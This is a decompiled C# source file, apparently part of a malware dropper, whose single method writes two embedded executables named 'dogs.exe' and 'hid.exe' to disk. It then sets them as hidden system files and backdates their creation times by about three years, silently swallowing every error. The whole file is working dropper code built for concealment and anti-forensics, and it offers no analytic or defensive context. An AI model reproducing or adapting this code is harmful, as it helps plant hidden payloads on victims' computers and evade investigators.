using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using a.My;
using a.My.Resources;

namespace a;

[StandardModule]
internal sealed class LoadDLL
{
	public static void Load()
	{
		try
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Config.FolderPath + "dogs.exe");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Config.FolderPath + "dogs.exe"))
			{
				FileSystem.FileOpen(1, Config.FolderPath + "dogs.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, (Array)Resources.a, -1L, false, false);
				FileSystem.FileClose(new int[1] { 1 });
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Config.FolderPath + "hid.exe");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Config.FolderPath + "hid.exe"))
			{
				FileSystem.FileOpen(1, Config.FolderPath + "hid.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, (Array)Resources.b, -1L, false, false);
				FileSystem.FileClose(new int[1] { 1 });
			}
			if (Config.Debug)
			{
				return;
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Config.FolderPath + "dogs.exe").Attributes = FileAttributes.Hidden | FileAttributes.System;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Config.FolderPath + "hid.exe").Attributes = FileAttributes.Hidden | FileAttributes.System;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			if (Config.CopyOldFileDates)
			{
				try
				{
					File.SetCreationTime(Config.FolderPath + "dogs.exe", DateTime.Now.AddYears(-3).AddDays(-2.0));
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				try
				{
					File.SetCreationTime(Config.FolderPath + "hid.exe", DateTime.Now.AddYears(-3).AddDays(-2.0));
					return;
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
					return;
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}
}
